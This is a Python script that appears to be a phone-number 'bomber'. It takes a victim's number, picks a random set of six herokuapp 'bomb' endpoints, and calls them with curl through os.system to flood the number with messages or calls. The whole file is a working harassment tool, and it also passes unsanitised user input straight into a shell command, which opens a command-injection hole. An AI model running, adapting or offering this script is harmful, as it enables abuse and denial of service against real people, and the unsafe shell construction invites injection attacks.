import os
import time
import random
import datetime

def startup_time():
    Time=datetime.datetime.now().strftime('%H:%M:%S')
    os.system('clear')
    print(' ')
    print(' ')
    print('[~]         Tool Started at '+Time)
print(startup_time())

number = input('Should I tell you what to enter: ')

server1 = (' https://xlr81.herokuapp.com/bomb/'+number)
server2 = (' https://xlr82.herokuapp.com/bomb/'+number)
server3 = (' https://xlr83.herokuapp.com/bomb/'+number)
server4 = (' https://xlr84.herokuapp.com/bomb/'+number)
server5 = (' https://xlr85.herokuapp.com/bomb/'+number)
server6 = (' https://xlr86.herokuapp.com/bomb/'+number)

pair1 = [server1, server2, server3, server4, server5]
pair2 = [server2, server3, server4, server5, server6]
pair3 = [server3, server4, server5, server6, server1]
pair4 = [server4, server5, server6, server1, server2]
pair5 = [server5, server6, server1, server2, server3]
pair6 = [server6, server5, server4, server3, server2]

pairs_lst = [pair1, pair2, pair3, pair4, pair5, pair6]

def bombing_time():
    Time=datetime.datetime.now().strftime("%H:%M:%S")
    print('Bombing started at '+Time)

def write_srvers():
    f = open("serverconf.txt", "w")
    l = random.choice(pairs_lst)
    f.writelines(l)
    print('[!] Bombing from the servers:>')
    print(l)
    f.close()

def read_servers():
    f = open("serverconf.txt", "r")
    os.system("curl"+f.read())

def main():
    write_srvers()
    read_servers()
    
samay = int(input('Enter Sleep Time (0 for no sleep): '))
os.system('clear')
print('')
print('')
print('')
print('___________Bombing will start in__________')
print(samay)
time.sleep(samay)
print('Initiating Bombing Servers...')
bombing_time()
main()

